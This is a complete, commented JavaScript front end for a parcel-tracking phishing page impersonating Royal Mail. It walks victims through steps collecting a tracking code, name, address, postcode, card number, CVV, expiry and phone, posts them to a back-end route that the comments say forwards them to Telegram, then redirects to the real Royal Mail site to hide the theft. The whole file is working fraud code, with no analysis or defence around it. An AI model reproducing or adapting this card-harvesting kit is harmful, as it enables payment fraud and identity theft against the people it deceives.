//I'm defining a set of variables here to store user input across different steps of the form.
// Each variable will hold the specific piece of data (e.g., tracking code, card number, etc.).
let trackingCodeValue = "";
let nameValue = "";
let billingAddressValue = "";
let postCodeValue = "";
let cardNumberValue = "";
let cvvValue = "";
let expiryValue = "";
let phoneValue = "";

// These constants point to the actual HTML elements for each step,
// so I can show or hide them depending on the user's progress.
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");
const step3 = document.getElementById("step3");

// I'm also grabbing references to the buttons in each step.
// I'll attach click events so I can move to the next step or submit.
const nextBtn1 = document.getElementById("nextBtn1");
const nextBtn2 = document.getElementById("nextBtn2");
const submitBtn = document.getElementById("submitBtn");

// Similarly, here are the references to the input fields,
// so I can read and validate their values.
const trackingCodeInput = document.getElementById("trackingCode");
const nameInput = document.getElementById("name");
const billingAddressInput = document.getElementById("billingAddress");
const postCodeInput = document.getElementById("postCode");
const cardNumberInput = document.getElementById("cardNumber");
const cvvInput = document.getElementById("cvv");
const expiryInput = document.getElementById("expiry");
const phoneInput = document.getElementById("phone");

// The first "Next" button on Step 1:
// I check if the user entered a tracking code, and if so,
// I hide Step 1 and show Step 2.
nextBtn1.addEventListener("click", () => {
    trackingCodeValue = trackingCodeInput.value.trim();
    if (!trackingCodeValue) {
      alert("Please enter your tracking code.");
      return;
    }
    step1.classList.remove("active");
    step2.classList.add("active");
});

// The second "Next" button on Step 2:
// I gather the name, billing address, and postcode.
// If any are missing, I alert the user; otherwise, I move to Step 3.
nextBtn2.addEventListener("click", () => {
    nameValue = nameInput.value.trim();
    billingAddressValue = billingAddressInput.value.trim();
    postCodeValue = postCodeInput.value.trim();

    if (!nameValue || !billingAddressValue || !postCodeValue) {
      alert("Please ensure your name, billing address and postcode are filled out.");
      return;
    }
    step2.classList.remove("active");
    step3.classList.add("active");
});

// The final "Submit" button on Step 3:
// I verify the credit card fields (card number, CVV, expiry) plus the phone/email.
// If all are present, I build an object with all the data and send it via fetch.
submitBtn.addEventListener("click", () => {
    cardNumberValue = cardNumberInput.value.trim();
    cvvValue = cvvInput.value.trim();
    expiryValue = expiryInput.value.trim();
    phoneValue = phoneInput.value.trim();

    // Check if any essential fields are missing.
    if (!cardNumberValue || !cvvValue || !expiryValue || !phoneValue) {
      alert("Please fill out all fields.");
      return;
    }

    // Create a JSON object that holds all the data the user entered.
    const dataToSend = {
      trackingCode: trackingCodeValue,
      name: nameValue,
      billingAddress: billingAddressValue,
      postCode: postCodeValue,
      cardNumber: cardNumberValue,
      cvv: cvvValue,
      expiry: expiryValue,
      phone: phoneValue,
    };

    // Use the fetch API to send this object to my Flask endpoint.
    // The endpoint "/send-to-telegram" is defined on the back end
    // to forward these details to Telegram.
    fetch("http://127.0.0.1:5000/send-to-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(dataToSend),
    })
      .then((res) => res.json()) // parse the response as JSON
      .then((data) => {
        console.log("Server response:", data);

        // If everything is good, I can redirect the user,
        // for example to the Royal Mail homepage or any URL I want.
        window.location.href = "https://royalmail.com";
      })
      .catch((err) => {
        // If there's an error, I log it and alert the user.
        console.error("Error:", err);
        alert("An error occurred while sending data to Telegram.");
      });
});

